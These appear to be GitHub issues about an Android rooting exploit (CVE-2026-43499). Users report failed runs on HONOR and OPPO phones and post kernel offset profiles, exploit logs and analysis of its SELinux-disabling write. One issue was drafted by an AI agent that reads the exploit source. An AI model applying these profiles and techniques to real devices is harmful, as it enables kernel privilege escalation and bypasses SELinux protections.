items.title: [Device Support] HONOR Magic7 Lite (BRP-N21M, SM6450, kernel 5.10.252) - CPU picker default (4,5) is outside the app's own cpuset, which silently breaks KernelSnitch
items.body:
## TL;DR

Two separate things, both worth a look:

1. **A concrete bug with a clean workaround:** the app defaults the CPU pair to **4,5** on this device, but the
   app process's `Cpus_allowed_list` is **`0-3,6-7`**. The exploit therefore hits
   `SYSCHK(sched_setaffinity(0, sizeof(cpu_set_t), &cpuset)): Invalid argument` **hundreds of times**, and the
   KernelSnitch `mm_struct` leak then fails on every attempt. **Selecting the `6,7 · 2.21 GHz` pair in the
   picker removes all EINVAL errors and the leak starts succeeding** (`0xffffff87a68cbc00`,
   `0xffffff87f826f800`) — though only intermittently (roughly a quarter to a half of attempts).

2. **What remains after the workaround:** the leak's hit rate is low, and the runs that do leak a valid
   `mm_struct` then stop at `prepare_kernel_page`'s even-byte rejection
   (`page ... stores an even byte over selinux_state.initialized; taking another`). No run so far has reached
   the `multicast_waiter` route stage. There is **no kernel panic** — the process just exits
   (`code=1`, or `code=137` once under memory pressure).

---

## 1. The CPU-pair / cpuset mismatch (the actionable finding)

App process cpuset on this device:

```
$ adb shell cat /proc/$(pidof com.ghostlock.app)/status | grep Cpus_allowed_list
Cpus_allowed_list:	0-3,6-7
```

The app's own CPU picker offers three pairs, and **the first one (which is selected by default here) is not in
that set**:

```
4,5 · 2.21 GHz     <-- default selected
6,7 · 2.21 GHz     <-- inside 0-3,6-7
0,1 · 1.80 GHz     <-- inside 0-3,6-7
```

CPU topology on the device:

```
possible : 0-7      present : 0-7      online : 0-7
cpu0-3   : 1804800 kHz
cpu4-7   : 2208000 kHz
nproc    : 6
```

With the default pair the log fills with these (a single run produced over a hundred):

```
[!] SYSCHK(sched_setaffinity(0, sizeof(cpu_set_t), &cpuset)): Invalid argument
```

and the leak never succeeds:

```
[*] [spray] mm spray + kernelsnitch ready (cpu=8) +125ms
[*] [spray] finding futex collisions... +271ms
[*] [spray] early collision screen 12/7 at 31%
[*] [spray] futex collisions found +776ms
[*] [spray] mm_struct leaked=0xffffffffffffffff +3186ms
[-] KernelSnitch mm_struct leak failed
   ... same on all four prepare_kernel_page attempts ...
[-]   heap spray failed
[-] W1: SELinux attempt 1 route failed; backing off
[-] Write 1 failed
<b> native exited code=1
```

After selecting `6,7` in the picker (verified: the main screen then reads `CPU cores  6,7 · 2.21 GHz`):

```
[*] cpu pair: main=6 consumer=7
[*] main thread running on cpu=6
[*] [spray] mm spray + kernelsnitch ready (cpu=8) +127ms
[*] [spray] mm_struct leaked=0xffffff87a68cbc00 +737ms     <-- valid
[*] [spray] mm_struct leaked=0xffffff87f826f800 +1037ms    <-- valid
```

**EINVAL count went from >100 to 0**, and valid leaks appeared. This looks like a genuine defect in how the
recommended/selected CPU pair is chosen for this device: the pair the picker defaults to is outside the process
cpuset, so the affinity calls fail and the timing-sensitive leak cannot work. Whether the picker should filter
to the current cpuset (or the resolver should prefer a pair inside it) is a maintainer decision, but it is easy
to reproduce and, from a user's perspective, looks like "the app says Supported but the exploit never works".

## 2. What still fails after the workaround

Three runs with the `6,7` pair:

| run | cpuset EINVAL | `mm_struct` leaks | outcome |
|---|---|---|---|
| 1 | 0 | all `0xffffffffffffffff` | `native exited code=137` (SIGKILL, during a spray) |
| 2 | 0 | 1 valid, 3 failed | `prepare_kernel_page` retries exhausted, `exit code=1` |
| 3 | 0 | all `0xffffffffffffffff` | `prepare_kernel_page` retries exhausted, `exit code=1` |

In the run where a valid `mm_struct` did appear, the next stage rejected the candidate page:

```
[-] page ffffff87f8268000 stores an even byte over selinux_state.initialized; taking another
[-] prepare_kernel_page retry 2/4 +1945ms
```

So the KernelSnitch hit rate itself is the limiting factor now, plus the repeated
`selinux_state.initialized` rejection. Notably this is the same pair of symptoms reported for the HONOR 400
Smart in #372 (`prepare_kernel_page` even-byte rejection, then a route-stage failure), so the two devices may
share a cause.

Relevant kernel config for this device (from the boot image):

```
CONFIG_KASAN=y
CONFIG_KASAN_HW_TAGS=y
CONFIG_SLUB=y / CONFIG_SLUB_DEBUG=y
CONFIG_SLAB_FREELIST_RANDOM=y
CONFIG_SLAB_FREELIST_HARDENED=y
CONFIG_ARM64_4K_PAGES=y / CONFIG_ARM64_VA_BITS=39
```

`kernelsnitch.mm_struct_sz` was tried at 512 and 4096 as well as the default 1024; none changed the hit rate
appreciably.

---

## The profile I built (so the device is reproducible)

`ghostlock-extract` on this kernel's `boot.img`:

```
primitive                remove_waiter@0x1ecf3c unpatched          <-- CVE present
rt_mutex_waiter          (no rt_mutex_waiter type in BTF)
mm_struct size           (unavailable)
pselect chain            not attempted (no embedded BTF)
path multicast_waiter    available (ip_mc_msfadd=absent ip_mc_source@0xffffffc0094c6f78)
path select_stack        available (core_sys_select@0xffffffc00857193c futex_wait@0xffffffc008292fc0)
path tcp_zerocopy        available (tcp_zerocopy_receive@0xffffffc00946f788)
suggested route          multicast_waiter (medium)
reasons                  - 5.x kernel with the multicast path present
                         - pselect route not derivable on this layout
info: multicast waiter_off derived = 0x150 (setsockopt depth 0x360 - futex depth 0x210)
warning: 5.10.252-... is unverified; no family-derived geometry will be emitted
warning: embedded BTF not found; struct offsets fall back to target.h defaults
warning: credential template omitted; the built-in profile must supply it
```

The extractor's `waiter_off = 0x150` (336) cannot be used as written — PROFILE_SCHEMA requires
`waiter_off + lock_offset + 8 <= buffer_size`, and with the bundled 5.15 multicast `buffer_size = 264` that is
336 + 56 + 8 = 400 > 264. So the route fields use the values all five bundled 5.15 multicast profiles agree on
(`waiter_off=96`, `buffer_size=264`, `task_offset=48`, `lock_offset=56`), which also keeps the trio consistent
with arm64 `rt_mutex_waiter` (task @0x30, lock @0x38). `task_struct.*` comes from this device's own offsets;
`cred.*` uses the bundled 6.x credential values with `copy_size` raised to 176 for the multicast requirement
`copy_size >= 0xa0`.

```hocon
release = "5.10.252-android12-9-00009-gf960ed27302b-ab15212796"
schema_version = 1
kernel_major = 5
recommend_shizuku = 0
kernel_phys_load = null
kernel_phys_offset = null
route {
  multicast_waiter {
    waiter_off = 96
    buffer_size = 264
    task_offset = 48
    lock_offset = 56
    compact_waiter = 1
  }
}
fallback { to = "none" }
kernelsnitch { collisions = 8  mm_struct_sz = 1024 }
task_struct {
  prio=132 normal_prio=140 sched_task_group=784 pi_lock=2156 pi_waiters=2176
  pi_top_task=2192 pi_blocked_on=2196 pid=1480 tgid=1484 atomic_flags=1424
  real_cred=1912 cred=1920 comm=1936 tasks=1224 seccomp=2120
}
cred {
  copy_size=176 usage_offset=0 usage_value=1 caps_offset=48 caps_count=5 caps_value=-1
  ref_count=4
  ref0_offset=96  ref0_image=1
  ref1_offset=104 ref1_image=1
  ref2_offset=112 ref2_image=1
  ref3_offset=120 ref3_image=1
}
offset {
  init_task=41598080 init_cred=41683040 empty_zero_page=43642880 root_task_group=43663424
  selinux_enforcing=44383128 selinux_blob_sizes=36682368 security_hook_heads=36680680
  slide_nfulnl_logger=41554240 slide_loggers_0_1=41554040 slide_boot_id=44510141
}
```

This imports cleanly, validates (`hasProfile=true invalid=0`), the app shows **Supported / Profile ready**, and
the compiled `profile.bin` decodes as `frontend=1 backend=1 middleware=3`, i.e. the `multicast_waiter` route is
selected. So the profile side looks correct.

---

## Device

| Field | Value |
|---|---|
| Model | HONOR Magic7 Lite (BRP-N21M / BRP-NX1M) |
| SoC | Qualcomm **SM6450** ("parrot") |
| Build | `BRP-N21M 10.0.0.168D(DEMC819E6R1P1)` |
| Kernel | `5.10.252-android12-9-00009-gf960ed27302b-ab15212796` |
| SELinux | Enforcing; app path is `u:r:untrusted_app:s0`, `Seccomp=2 Seccomp_filters=1` |
| Bootloader | locked, dm-verity enforcing |
| cpuset | app process restricted to `0-3,6-7` |

---

## Questions

1. **CPU pair:** should the app's recommended/selected CPU pair be constrained to the process's
   `Cpus_allowed_list`? On this device the picker's default (`4,5`) is outside `0-3,6-7`, and every
   `sched_setaffinity` then fails with `EINVAL`, which silently disables the leak. Selecting `6,7` fixes it.
2. Does KernelSnitch work reliably on kernels with `CONFIG_KASAN_HW_TAGS=y` +
   `CONFIG_SLAB_FREELIST_RANDOM=y` + `CONFIG_SLAB_FREELIST_HARDENED=y`? Is `kernelsnitch.mm_struct_sz` the right
   knob for such kernels (1024/512/4096 made no clear difference here), or is the low hit rate expected?
3. The `stores an even byte over selinux_state.initialized` rejection is identical to what #372 reports on the
   HONOR 400 Smart. Are these two devices hitting the same root cause?
4. Is `multicast_waiter` correct for this 5.10 kernel? The extractor suggests it while also saying the pselect
   route is not derivable here.
5. `cred.refN_image` had to be filled with non-zero placeholders because 5.10.252 has no BTF and the extractor
   omits the credential template for 5.x. Is there a supported way to derive those on a 5.x kernel?

Happy to run any diagnostic build, or to collect `/proc/iomem`, `dmesg`, extra logs, or a
`ghostlock-extract --analysis` dump for this kernel on request.

[2-ATTACH-CPU45-EINVAL.log.txt](https://github.com/user-attachments/files/33275287/2-ATTACH-CPU45-EINVAL.log.txt)
[3-ATTACH-CPU67-VALID-LEAK.log.txt](https://github.com/user-attachments/files/33275285/3-ATTACH-CPU67-VALID-LEAK.log.txt)
[4-ATTACH-magic7-multicast-v3.conf.txt](https://github.com/user-attachments/files/33275286/4-ATTACH-magic7-multicast-v3.conf.txt)
[5-ATTACH-compiled-profile.bin.txt](https://github.com/user-attachments/files/33275284/5-ATTACH-compiled-profile.bin.txt)

items.title: tcp_zerocopy` route reports `success1` on HONOR 400 Smart (SM6375, kernel 6.1.99-…ab13565525) but the W1 write never lands; run ends in a kernel panic
items.body:
## Summary

`tcp_zerocopy` reports a fully clean route result on this device, but the W1 write never lands and the run
always ends in a kernel panic.

```
[*] [route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done          <-- EDEADLK, every attempt
[*] tcp route done=1 calls=1 success=1 status=0 clean=1/1 step=0 errno=0
[*] [route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
[*] [T+4504ms]   PI route done
```

Observed across two full runs:

* the route stage completes with `success=1 status=0 clean=1/1 errno=0` **five times** in the latest run,
* yet W1 never advances to W2 (no W2 line anywhere), i.e. the write to
  `offset.selinux_enforcing = 0x22063F0` never takes effect,
* W1 just loops through its `w1_attempts=15` budget and the machine panics (attempt 5 of run A, attempt 6 of
  run B). Because the panic takes the machine down, the debug log is only written for runs that survive —
  most exported logs are 0 bytes or null-filled.

`errno=35` is `EDEADLK`, which in `futex_requeue_pi` is returned when the word at `*uaddr2` holds the calling
thread's TID, so `rt_mutex_start_proxy_lock()` is never reached. My reading is that the PI chain is never
armed, and `success=1` is therefore a false positive for this kernel.

---

## Device

| Field | Value |
|---|---|
| Model | HONOR 400 Smart (LGN-NX1 / LGN-N31S) |
| SoC | Qualcomm **SM6375** ("blair") |
| Build | `LGN-N31S 9.0.0.102D(DEMC819E6R1P1)`, base `LGN-LGRP18-OVS 9.0.0.102` |
| Android | 15 (SDK 35), MagicOS 9.0 |
| Kernel | `6.1.99-android14-11-g6567ab14ba0d-ab13565525` |
| Config | `CONFIG_MODULE_SIG=y` (`MODULE_SIG_FORCE` unset), `CONFIG_KPROBES=y`, no `SECURITY_LOCKDOWN_LSM`, `CFI_CLANG`, `SHADOW_CALL_STACK`, `ARM64_PTR_AUTH`, `PANIC_ON_OOPS=y` |
| SELinux | Enforcing; app path is `u:r:untrusted_app:s0`, `Seccomp=2 Seccomp_filters=1` |
| Bootloader | locked, dm-verity enforcing |

---

## Profile

Generated from the device's own `boot.img`; exact `uname -r` match, accepted by the app
(`profile: hasProfile=true invalid=0`), status **Supported / Profile ready**.

```
$ ghostlock-extract.exe image/boot.img --phys 0xa8000000 --format conf --out profile.conf

info: kallsyms layout pre-6.4 recovered (101152 symbols)
info: (CVE-2026-43499 primitive present (remove_waiter@0xff886c still uses current)
warning: waiter fits at the last usable word (shift=3); wake_state falls outside the copied fd_set and relies on the kernel zero-initialising it
info: pselect chain __arm64_sys_pselect6->core_sys_select frames=pselect=0x90 pselect=0x1c0 futex=0x70 futex=0x60 futex=0x1b0 buffer=0x50 waiter=0x98 shift=1 (derived 3 - 2)
info: sizeof(mm_struct)=0x3C0
```

`kernel_phys_load` had to be passed manually because this device's `xbl_config` has no FDT memory map
(`xbl_config FDT parse failed: xbl_config contains no unique NOMAP/Kernel memory map`).

Verified symbol table (from the same image) — matches the compiled profile exactly:

```
kimage_text_base = 0xffffffc008000000   compact_waiter = 1   mm_struct_sz = 1024   pselect_waiter_shift = 1
off_init_task 0x1FCED80   off_init_cred 0x1FE12A8   off_root_task_group 0x21B4580   off_selinux_enforcing 0x22063F0
off_selinux_blob_sizes 0x159F7C8   off_security_hook_heads 0x159F0B8
off_slide_boot_id 0x2227498   off_slide_loggers_0_1 0x1FC2918   off_slide_nfulnl_logger 0x1FC29C8
rt_mutex_waiter: tree=0 pi_tree=24 task=48 lock=56 wake_state=64 ww_ctx=80
```

Route analysis reports all three paths available, with `select_stack (high)` suggested:

```
path multicast_waiter   available (ip_mc_msfadd=absent ip_mc_source@0xffffffc008e81910)
path select_stack       available (core_sys_select@0xffffffc0083b5b60 futex_wait@0xffffffc0081a4f14)
path tcp_zerocopy       available (tcp_zerocopy_receive@0xffffffc008e4354c)
```

(For reference: of the 63 bundled profiles only five carry multicast keys, all `5.15.x`, so multicast is not
applicable on 6.1 here.)

The `tcp_zerocopy` profile used for these runs:

```hocon
release = "6.1.99-android14-11-g6567ab14ba0d-ab13565525"
schema_version = 1
kernel_major = 6
recommend_shizuku = 0
kernel_phys_load = 2818572288      # 0xA8000000
kernel_phys_offset = null
route {
  tcp_zerocopy {
    compact_waiter = 1
  }
}
fallback {
  to = "select_stack"
  route {
    select_stack {
      waiter_shift = 1
    }
  }
}
kernelsnitch { collisions = 4  mm_struct_sz = 1024 }
task_struct { prio=132 normal_prio=140 sched_task_group=840 pi_lock=2340 pi_waiters=2360
              pi_top_task=2376 pi_blocked_on=2384 pid=1584 tgid=1588 atomic_flags=1520
              real_cred=2096 cred=2104 comm=2120 tasks=1360 seccomp=2304 }
cred { copy_size=136 usage_value=1 caps_offset=48 caps_count=5 caps_value=-1 }
offset { init_task=33353088 init_cred=33428136 empty_zero_page=35311616 root_task_group=35341696
         selinux_enforcing=35677168 selinux_blob_sizes=22673352 security_hook_heads=22671544
         slide_nfulnl_logger=33302984 slide_loggers_0_1=33302808 slide_boot_id=35812504 }
```

---

## Run B (attached in full, 14054 bytes / 221 lines)

```
[*] W1: SELinux attempt 1/15
[*] === W1: SELinux === target=0xffffff802a2063f0 mode=1 leaf=0
[*] prepare_kernel_page ok attempt=2 +3791ms
[*] tcp route done=1 calls=1 success=1 status=0 clean=1/1 step=0 errno=0
[*] [route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
[*] [T+6497ms]   PI route done
[*] W1: SELinux attempt 2/15
[-]   heap spray failed
[-] W1: SELinux attempt 2 route failed; backing off
[*] W1: SELinux attempt 3/15
[*] prepare_kernel_page ok attempt=1 +1592ms
[*] tcp route done=1 calls=1 success=1 status=0 clean=1/1 step=0 errno=0
[*] [T+17477ms]   PI route done
[*] W1: SELinux attempt 4/15
[*] prepare_kernel_page ok attempt=4 +5719ms
[*] tcp route done=1 calls=1 success=1 status=0 clean=1/1 step=0 errno=0
[*] [T+25586ms]   PI route done
[*] W1: SELinux attempt 5/15
[*] prepare_kernel_page ok attempt=1 +1491ms
[*] tcp route done=1 calls=1 success=1 status=0 clean=1/1 step=0 errno=0
[*] [T+29474ms]   PI route done
[*] W1: SELinux attempt 6/15
[*] prepare_kernel_page ok attempt=1 +1395ms
[*] [T+31021ms]   heap spray done
[*] [route] waiter parked; owner started
[*] [route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
   >>> log ends here (machine panicked mid-attempt 6)
```

| W1 attempt | prepare_kernel_page | tcp route result |
|---|---|---|
| 1 | ok (attempt 2) | `success=1 status=0 clean=1/1 errno=0` |
| 2 | — | heap spray failed |
| 3 | ok (attempt 1) | `success=1 status=0 clean=1/1 errno=0` |
| 4 | ok (attempt 4) | `success=1 status=0 clean=1/1 errno=0` |
| 5 | ok (attempt 1) | `success=1 status=0 clean=1/1 errno=0` |
| 6 | ok (attempt 1) | panicked mid-route |

Run A (also attached) is the same shape with three clean route completions; `select_stack` instead of
`tcp_zerocopy` reaches `CMP_REQUEUE_PI errno=35` and never enters a route loop (run survives or is SIGKILLed
with `code=137`).

---

## What was tried

* `select_stack` with `waiter_shift = 1` and with `waiter_shift = 0` — same `EDEADLK`, no route loop.
* `tcp_zerocopy` with `compact_waiter = 1` + `select_stack` fallback — route runs and reports clean 5×,
  W1 still never verifies, run panics.
* An `execution { ... }` block in the imported profile is rejected ("profile needs correction"), and the app
  exposes no UI for `execution.*` on an imported profile here (Parameter configuration shows only
  "Load configuration" / "Profile documentation").
* The `ghostlock` CLI can't be used for comparison: `--load-prebuilt-profile profile.conf` returns
  `[!] cannot load profile` (it appears to want the compiled `.bin`, which only the app writes).
* Memory is tight on this device (`Mem: 3551 MB total, 3495 used, 30-173 MB free`); one earlier run was
  killed with `native exited code=137` (SIGKILL) during a second spray before reaching the route.

---

## Question

1. Which route is correct for `6.1.99-android14-11-g6567ab14ba0d-ab13565525` (HONOR/SM6375)? The extractor
   suggests `select_stack` but also warns its geometry is degraded (`wake_state falls outside the copied
   fd_set`), while `tcp_zerocopy` runs further before panicking.
2. Is `errno=35` at the first `CMP_REQUEUE_PI` expected to be followed by a **successful** route report, or
   does it mean the route was never armed (making `success=1 clean=1/1` misleading)?
3. If the route is armed, what would make the W1 write at `offset.selinux_enforcing = 0x22063F0` fail to take
   effect while the route reports clean? That offset is derived by symbol rather than BTF member — should it
   point elsewhere on this kernel?
4. Is the `stores an even byte over selinux_state.initialized` rejection (all four candidates on some attempts,
   succeeding on attempt 1/2/4 of others) a symptom of the same cause or an independent quirk?
5. Is a build with an incremental/flushing debug log possible? The log is written only at the end, so any run
   that panics leaves a 0-byte or null-filled log, which makes remote debugging hard.

Happy to run any additional diagnostic build, and/or collect `/proc/iomem`, `dmesg`, or a
`ghostlock-extract --analysis` dump for this kernel on request.

[RUN-050906-FULL.log.txt](https://github.com/user-attachments/files/33272262/RUN-050906-FULL.log.txt)
[RUN-051701-FULL.log.txt](https://github.com/user-attachments/files/33272263/RUN-051701-FULL.log.txt)

items.title: 荣耀平板 9 Pro (5.10.66)的适配帮助请求
items.body:
设备信息

· 设备: 荣耀平板 V8 Pro (ROD-W09)
· SoC: MediaTek Dimensity 8100 (MT6895)
· 系统: MagicOS 8.0 (Android 14)
· 内核: 5.10.66-android12-9-ge639f4185278
· 安全补丁: 2026-02-01
· GhostLock 版本: 1.2+514 build 2026-09-27 00:34:10
· 运行模式: Shizuku (uid=2000)

问题描述

使用 multicast_waiter 路由可以稳定触发 CVE-2026-43499，UAF 和 PI 链控制均成功，但在最后一步 Write 1 failed，native 退出，root 脚本从未被执行。内核不崩溃，设备正常运行。

已尝试的调整

参数 尝试值 结果
kernelsnitch.mm_struct_sz 1024 prepare_kernel_page 通过，但 Write 1 failed
 512 内核瞬间崩溃
prepare_kernel_page 2048 反复重试，超时
route.multicast_waiter.buffer_size 264 Write 1 failed
prepare_kernel_page 272 重试，超时
route.multicast_waiter.waiter_off 120 Write 1 failed
prepare_kernel_page 112 重试，超时
route.multicast_waiter.compact_waiter 0 / 1 均无改善
运行模式 Shizuku / direct 均 Write 1 failed

可能的根因猜测

1. native 内部对 pipe_inode_info 或 pipe_buffer 环形缓冲的布局假设与荣耀内核不匹配：从 pipe_write 反汇编看，pipe_buffer 本身布局是标准的，但 pipe_inode_info->bufs 数组偏移、head/tail 掩码、max_usage 等字段可能与 native 硬编码值不同。
2. 物理地址转换逻辑不匹配：MTK 平台 kernel_phys_load = 0x80000000 可能是对的（KASLR 成功），但 native 在 direct_to_page 转换时可能使用了错误的 P0_PAGE_OFFSET 或 vmemmap 步长。
3. SELinux initialized 字段干扰：prepare_kernel_page 在 mm_struct_sz = 1024 时能通过，但选择的物理页可能仍与 selinux_state 相邻，导致后续 pipe_buffer 伪造时覆盖了错误数据。

请求

1. 是否有其他 MTK 天玑8100/8200 设备成功使用 multicast_waiter 路由的案例？
2. native 源码中 pipe_phys_write 或 install_pipe_physrw 是否假定某个固定的 pipe_inode_info 布局？如果有，能否给出需要调整的字段？
3. 是否可以提供一组 MTK 平台已验证的 execution.routes.multicast_waiter 参数？

任何关于 native 侧 pipe_buffer 伪造逻辑的线索都将非常感谢。如果需要更多反汇编片段（如 pipe_write、rt_mutex_adjust_prio_chain、commit_creds 等），我可以提供。

items.title: [MTK] OPPO A3 Pro (PJY110, MT6877) — exploit primitive works but W1 always fails; forcing a different mm_struct_sz turns the safe failure into a kernel panic
items.body:
# [MTK] OPPO A3 Pro (PJY110, MT6877) — exploit primitive works but W1 always fails; forcing a different mm_struct_sz turns the safe failure into a kernel panic

> **⚠️ This issue was drafted and submitted by an AI agent (Hermes Agent), on behalf of a human
> user who performed the on-device testing and approved every step.**
> The device reports, panic records and extractor output quoted below were collected from the real
> hardware and stock OTA by that user; the AI wrote the analysis and the code reading.
> Maintainers: please weigh the technical content on its own merits — both the AI and the user are
> happy to re-run any command or provide raw artifacts to verify any claim here.
> **这是我的 AI 助手（Hermes Agent）代我起草并提交的 issue**，真机测试由我本人操作并逐步确认，
> 下方设备信息、panic 记录与 extractor 输出均取自真实硬件与原厂 OTA；分析与代码阅读由 AI 完成。
> 所有结论都可复现，需要任何原始产物我们都可以提供。

**I have read the docs and I am NOT asking to have this device marked as supported.** This is a report of
analysis results plus a reproducible failure mode that I think is worth documenting, with a
question at the end. I can provide any artifact below on request.

---

## Device / kernel

| | |
|---|---|
| Device | OPPO A3 Pro 5G (PJY110 / OP59FB) |
| SoC | MediaTek MT6877 (Dimensity 7050), `ro.board.platform=mt6877`, arm64-v8a |
| Kernel | `6.6.82-android15-8-o-g3b30dff93dd7-4k` |
| Fingerprint | `OPPO/PJY110/OP59FB:15/AP3A.240617.008/U.21d31d5-2:user/release-keys` |
| Build | `PJY110_15.0.0.1600(CN01)`, security patch 2026-01-01 (boot.img built 2025-12-30) |
| CPU topology | cpu0-5 @ 2.0 GHz (little), cpu6-7 @ 2.6 GHz (big) — 6+2 big.LITTLE |
| Bootloader | `ro.boot.flash.locked=1`, `verifiedbootstate=green`, `veritymode=enforcing` (stock, no root) |
| App | built from `main` @ `289b5c6` (v1.2), arm64 |

Not present in the 72 bundled profiles in `app/src/main/assets/kernel_profiles/`.

## What works

The exploit primitive and the derived offsets are fine:

```
$ ghostlock-extract boot.img --iomem /dev/null --analysis
info: kallsyms layout 6.4+ recovered (116352 symbols)
info: (CVE-2026-43499 primitive present (remove_waiter@0x105b25c still uses current)
info: MediaTek compressed image; _text confirms kernel_phys_load=0x80000000 (DRAM base)
kernel_family           STRUCT_OFFSETS_6_6 (verified Android family)
rt_mutex_waiter         lock=0x58 pi_tree=0x28 task=0x50 tree=0x0 wake_state=0x60 ww_ctx=0x68 size=0x70
mm_struct size          0x4c0
primitive               remove_waiter@0x105b25c unpatched
pselect chain           derived shift=-2 waiter=0x90 chain=__arm64_sys_pselect6->core_sys_select
path multicast_waiter   available (ip_mc_msfadd=absent ip_mc_source@0xffffffc080ee87c0)
path select_stack       available (core_sys_select@0xffffffc0803dfcdc futex_wait@0xffffffc0801a50d4)
path tcp_zerocopy       available (tcp_zerocopy_receive@0xffffffc080ea8e04)
suggested route         select_stack (high)
```

I verified the embedded BTF is intact and self-consistent (decompressed vmlinux, `.BTF` section at
offset `0x175e8e8`, ver=1, 24 + 4047120 + 2479978 = **6,527,122 bytes**, matching the extractor's
reported `btf_size` exactly), so `sizeof(mm_struct)=0x4c0` etc. are real BTF values, not guesses.

At runtime the spray and leak both succeed:

```
[*] [spray] mm spray + kernelsnitch ready (cpu=8) +120ms
[*] [spray] finding futex collisions... +289ms
[*] [spray] futex collisions found +760ms
[*] [spray] mm_struct leaked=0xffffff80d7ca9e00 +822ms
[*] [spray] mm_struct leaked=0xffffff80f3208a00 +939ms
[*] [spray] mm_struct leaked=0xffffff8157600a00 +933ms
[*] [spray] payload ready +823ms
```

**No kernel panic.** `kernel_phys_load` is fine despite MediaTek: `_text` delta confirms
`0x80000000`, and the fallback is self-consistent (text − phys = −0x4000000000 = VA_BITS=39 +
KASLR base).

## What always fails

```
[-] page ffffff80d7ca8000 stores an even byte over selinux_state.initialized; taking another
[-] page ffffff80f3208a00 stores an even byte over selinux_state.initialized; taking another
[-] page ffffff8157600000 stores an even byte over selinux_state.initialized; taking another
[-] prepare_kernel_page retry 2/4 +2959ms
[-] prepare_kernel_page retry 3/4 +4014ms
[-] prepare_kernel_page retry 4/4 +4966ms
[-] W1: SELinux attempt 15 route failed; backing off
[-] Write 1 failed
[-] heap spray failed
result: exploit failed (exit code=1)
```

`run_state.json` stops at `"w1a": "in_progress"`.

I read the source and I believe I understand the mechanism:

- `prepare_kernel_page()` (`src/core/support/util.cpp:621`) does
  `base = leaked & ~(ORDER3_SIZE - 1)` with `ORDER3_SIZE = 0x8000`.
- `payload_write_layout()` (`src/core/memory/payload_builder.cpp:68`) sets
  `layout.right = page_base + 0x100` for `WriteMode::Zero && preserve_child`.
- The gate `payload_write_layout_accepts_page()` (`payload_builder.cpp:96`) rejects when
  `((layout->right >> 16) & 1) == 0`. Since `0x100 < 0x10000`, this is effectively
  `(base >> 16) & 1 == 0`.

With a `0x8000`-aligned base, bit16 is 1 only for N ≡ 2,3 (mod 4) — i.e. the gate passes for
roughly half of the 0x8000 slots. **It is not structurally unreachable**, but on this unit all
observed leaks landed on a slot where bit16 = 0:

| run | leaked `mm_struct` | base | `(base>>16)&1` | gate |
|---|---|---|---|---|
| 1 | `0xffffff80d7ca9e00` | `0xffffff80d7ca8000` | 0 | reject |
| 2 | `0xffffff80f3208a00` | `0xffffff80f3208000` | 0 | reject |
| 3 | `0xffffff8157600a00` | `0xffffff8157600000` | 0 | reject |

For comparison, issue #249 (a different MTK 6.6 device) shows the same code path *passing* once
(`leaked=0xffffff8005193700` → `base=0xffffff8005190000` → `(base>>16)&1 = 1` → `prepare_kernel_page ok`)
and then rejecting on 8+ other attempts whose bases had bit16 = 0. So the gate is a genuine
probabilistic filter, and that device's success rate is visibly low.

Widening `execution.heap.prepare_max_attempts` from 4 to 40 changed nothing here — and reading the
KernelSnitch retry path, it only retries when the whole attempt failed anyway, so that knob cannot
help this particular gate.

**I now understand this gate is a safety net, not an obstacle**, so I stopped trying to widen it —
see the next section for what happened when I did try to change the slot phase directly.

## The reproducible panic (this is the part I think is interesting)

Following the "device SLUB stride vs BTF sizeof" note (`tools/extract_rs/src/report.rs:69`:
`0x400 is the device SLUB stride, not the BTF 0x3c0`), I set `kernelsnitch.mm_struct_sz = 1216`
in the imported profile (i.e. the BTF `sizeof`, instead of letting the 6.6 path fall back to the
compiled-in `MM_STRUCT_SZ = 0x500`). My intent was to shift the KernelSnitch scan stride so the
leak would land on a different slot phase and pass the gate.

Result: the previously **safe** failure (exit code 1, device keeps running) became a **kernel
panic**. Three runs, two of them with different CPU pairs:

```
KEYINFO= Unable to handle kernel paging request at virtual address ffffff8457b58000
KEYINFO= Unable to handle kernel paging request at virtual address ffffff8457b58000
KEYINFO= Unable to handle kernel paging request at virtual address ffffff86c7fb0000

stackhash (all three): efab135179c71fbb603e31e41df8c10588efe84754d25cbe6880da1437362528
FST_FRAME=mrdump_common_die+0x288/0x3a8
COMM=libghostlock.so
mModule = CriticalLogKernel  mIssue = panic
```

(Evidence note: Oppo's `BootReceiver` only keeps the *most recent* panic record, so the third line
is the one re-readable via `adb logcat -d -b all | grep KEYINFO=`; the first two were read
immediately after each of their own reboots. The stackhash was identical in all three.)

Observations:

- stackhash identical across runs with **different CPU pairs (6,7 and 0,1)** and different retry
  counts ⇒ the failure point is deterministic; CPU pair and retry counts are not the variables.
- The faulting address is **~16 GB above** the leaked direct-map addresses
  (`0xffffff84...` vs `0xffffff80...`), so it is not a small offset error — something dereferenced
  an unmapped kernel VA.
- Setting `mm_struct_sz` to the BTF value changed the KernelSnitch scan stride
  (`kernelsnitch.h:260`: `mm_struct_candidate += ks->mm_struct_sz`). I had assumed
  `mm_struct_stride()` would take my override — it does not for 6.6 (`profile-core`/native only
  consults `mm_struct_sz` for the android14-6.1 family; `kernelsnitch-6x.conf` documents it as an
  explicit `null` for other families), so my value changed the scan phase in a way I had not
  modelled and the run latched onto a position that passed the gate but was not a real `mm_struct`.

So my read is: with the shipped default (`mm_struct_sz` unset ⇒ 0x500) the leak lands on a slot the
gate rejects → **safe failure**; my override moved the scan onto a false-positive that passed the
gate → write to unmapped VA → panic. **The default is the safer configuration, and I have reverted
to it.**

## My question

1. Is my reading of the gate correct — that `((right >> 16) & 1)` passes for ~half of the 0x8000
   slots, so W1 on this kernel is a **low-probability** pass rather than an impossible one? And if
   so, is there a supported way to *shift the leak's slot phase* (so fewer attempts are wasted on
   bit16 = 0 slots) — e.g. a profile field or route I have missed? Issue #249 looks like the same
   situation on a different MTK 6.6 device (1 pass, 8+ rejects), and I could not find a knob for it.
   I deliberately did **not** retry in a loop after the panic described above, because I do not want
   to keep panicking the device if the answer is "that phase is not tunable".

2. Given MEDIATEK.md requires `/proc/iomem` + `/proc/kallsyms` from an *already rooted* device to
   fill in the two physical addresses, is there any supported path to bootstrap a device like this
   one (PJY110) that has no bundled profile and no pre-existing root? On this unit shell and
   Shizuku both get `Permission denied` on `/proc/iomem` and `/proc/kallsyms` (readable only by
   root), so the mtk-phys route is circular for a first-time root. For what it's worth,
   `kernel_phys_load` did not appear to be the blocker here — the `_text`-derived `0x80000000`
   looked self-consistent and the run got all the way to the W1 gate.

